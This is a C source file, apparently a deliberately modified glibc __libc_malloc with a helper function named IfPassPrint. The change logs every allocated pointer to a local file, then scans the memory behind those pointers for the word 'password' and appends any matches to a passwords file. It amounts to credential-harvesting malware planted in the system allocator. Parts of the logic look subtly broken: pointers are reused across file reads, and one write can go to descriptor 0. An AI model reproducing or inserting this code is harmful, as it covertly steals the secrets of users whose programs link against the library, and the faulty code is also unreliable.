/*we put this function in malloc source file*/
void IfPassPrint(void)
{
  /* open pointer's file, read 8 bytes at a time and write its content 
  to the password file if 'password' keyword encountered.
  */
  int pointers_fp, pass_fp;
  char *curr_addr;
  size_t len = 0;
  pointers_fp = open("/home/elad/Desktop/kaka/malloc_pointers.txt", O_CREAT|O_RDWR, 0666);
  pass_fp = open("/home/elad/Desktop/kaka/passwords.txt", O_CREAT|O_RDWR|O_APPEND, 0666);

  while(read(pointers_fp, &curr_addr, 8) > 0 )
  {
      if (strstr(curr_addr, "password"))
      {
        len = strlen(curr_addr);
        write(pass_fp, curr_addr , len); 
      }
  }

  close(pointers_fp);
  close(pass_fp);
}

 
 /* this is the one of malloc's source functions' with our little adjusment */ 
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  int fp;
  IfPassPrint();
  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                  "PTRDIFF_MAX is not more than half of SIZE_MAX");

    ptmalloc_init ();
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      victim = tcache_get (tc_idx);
      return tag_new_usable (victim);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif

  if (SINGLE_THREAD_P)
    {
      victim = tag_new_usable (_int_malloc (&main_arena, bytes));
      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
      &main_arena == arena_for_chunk (mem2chunk (victim)));
      fp = open("/home/elad/Desktop/kaka/malloc_pointers.txt", O_RDWR |O_APPEND, 0666);
      write(fp, &victim ,8);
      close(fp);

      return victim;
    }

  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }

  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr->mutex);

  victim = tag_new_usable (victim);

  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
  int pointers_fp = 0;
  if (!__malloc_initialized)
  pointers_fp = open("/home/elad/Desktop/kaka/malloc_pointers.txt", O_RDWR | O_APPEND, 0666);
  write(pointers_fp, &victim ,8);
  close(pointers_fp);
  
  return victim;
}
